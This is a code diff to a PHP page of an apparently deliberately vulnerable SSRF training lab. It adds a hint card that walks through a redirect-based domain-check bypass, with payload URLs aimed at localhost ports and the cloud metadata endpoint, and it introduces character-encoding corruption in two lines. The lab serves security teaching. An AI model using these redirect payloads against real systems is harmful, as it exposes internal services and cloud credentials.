@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 session_start();
 // SSRF Lab 4 - Real-World Domain Restriction Bypass with Redirects (SecureAuth)
 // Bug hunters find SSRF in "Test Callback" features where domain is validated
@@ -219,7 +219,7 @@ $tests = array_reverse($_SESSION['sso_tests']);
 <div class="main-content">
     <div class="hint-banner">
         <i class="bi bi-lightbulb"></i>
-        <strong>Bug Bounty Tip:</strong> SecureAuth tests callback URLs before saving SSO configurations. Domain restrictions are validated on the <em>initial URL</em>, but redirects are followed during the test — a classic redirect-based SSRF bypass.
+        <strong>Bug Bounty Tip:</strong> SecureAuth tests callback URLs before saving SSO configurations. Domain restrictions are validated on the <em>initial URL</em>, but redirects are followed during the test â€” a classic redirect-based SSRF bypass.
     </div>
 
     <div class="row g-4">
@@ -285,7 +285,7 @@ $tests = array_reverse($_SESSION['sso_tests']);
                             </div>
                         <?php endif; ?>
                         <div class="raw-panel">
-<?php echo htmlspecialchars(mb_strimwidth($testResult['body'], 0, 2000, '…')); ?>
+<?php echo htmlspecialchars(mb_strimwidth($testResult['body'], 0, 2000, 'â€¦')); ?>
                         </div>
                     </div>
                     <?php endif; ?>
@@ -330,6 +330,60 @@ $tests = array_reverse($_SESSION['sso_tests']);
                         <li>CDN origin validation with redirect support</li>
                         <li>Open Graph / oEmbed fetchers with redirect chains</li>
                     </ul>
+                </div>
+            </div>
+            <!-- Hint Card -->
+            <div class="card mt-4" style="border-left:4px solid #f59e0b; background:#fffbeb;">
+                <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <h6 class="fw-bold mb-0" style="color:#b45309;"><i class="bi bi-lightbulb-fill"></i> Lab Hint — How to Bypass</h6>
+                        <button class="btn btn-sm" style="background:#fef3c7;color:#92400e;border:1px solid #fcd34d;font-size:0.8rem;" onclick="document.getElementById('hint-steps').classList.toggle('d-none')">
+                            <i class="bi bi-eye"></i> Show / Hide
+                        </button>
+                    </div>
+
+                    <div id="hint-steps" class="d-none">
+                        <p style="font-size:0.85rem;color:#78350f;margin-bottom:10px;">
+                            The server only validates the <strong>initial URL domain</strong> but follows HTTP redirects using
+                            <code>CURLOPT_FOLLOWLOCATION</code>. To bypass, you need a URL that:
+                            <br>① Starts with a <strong>secureauth.io</strong> host (passes domain check)
+                            <br>② Redirects to an <strong>internal / private IP</strong> (curl follows it blindly)
+                        </p>
+
+                        <div style="font-size:0.83rem;color:#451a03;">
+                            <strong>Step 1 — Check your /etc/hosts</strong>
+                            <div style="background:#1e293b;color:#86efac;font-family:monospace;font-size:0.8rem;border-radius:5px;padding:10px;margin:6px 0;">
+                                grep secureauth.io /etc/hosts
+                                <br># Should show: 127.0.0.1 secureauth.io
+                                <br># If missing, add it: echo "127.0.0.1 secureauth.io" | sudo tee -a /etc/hosts
+                            </div>
+
+                            <strong>Step 2 — Use the open redirect endpoint</strong>
+                            <p style="margin:4px 0 6px;color:#78350f;">This lab includes a redirect helper at <code>/subdomains/fetch/redirect.php?to=&lt;TARGET&gt;</code></p>
+                            <div style="background:#1e293b;color:#93c5fd;font-family:monospace;font-size:0.8rem;border-radius:5px;padding:10px;margin:6px 0;">
+                                http://secureauth.io/subdomains/fetch/redirect.php?to=http://127.0.0.1/
+                            </div>
+
+                            <strong>Step 3 — Submit as the Callback URL</strong>
+                            <p style="margin:4px 0 6px;color:#78350f;">Paste the URL above into the Callback URL field and click <em>Test Callback</em>.
+                            The domain check sees <code>secureauth.io</code> ✓ — then curl follows the 302 to <code>http://127.0.0.1/</code></p>
+
+                            <strong>Step 4 — Try internal endpoints</strong>
+                            <div style="background:#1e293b;color:#f9a8d4;font-family:monospace;font-size:0.79rem;border-radius:5px;padding:10px;margin:6px 0;">
+                                # Access localhost web server:<br>
+                                http://secureauth.io/subdomains/fetch/redirect.php?to=http://127.0.0.1/<br><br>
+                                # Access localhost on different ports:<br>
+                                http://secureauth.io/subdomains/fetch/redirect.php?to=http://127.0.0.1:8080/<br><br>
+                                # Access cloud metadata (if available):<br>
+                                http://secureauth.io/subdomains/fetch/redirect.php?to=http://169.254.169.254/latest/meta-data/
+                            </div>
+
+                            <div style="background:#ecfdf5;border:1px solid #6ee7b7;border-radius:5px;padding:8px;margin-top:8px;font-size:0.8rem;color:#065f46;">
+                                <i class="bi bi-check-circle-fill"></i> <strong>Success indicator:</strong>
+                                When the bypass works, the <em>Final URL</em> will differ from the <em>Initial URL</em> and the response body will contain content from the internal target — proving SSRF via open redirect.
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
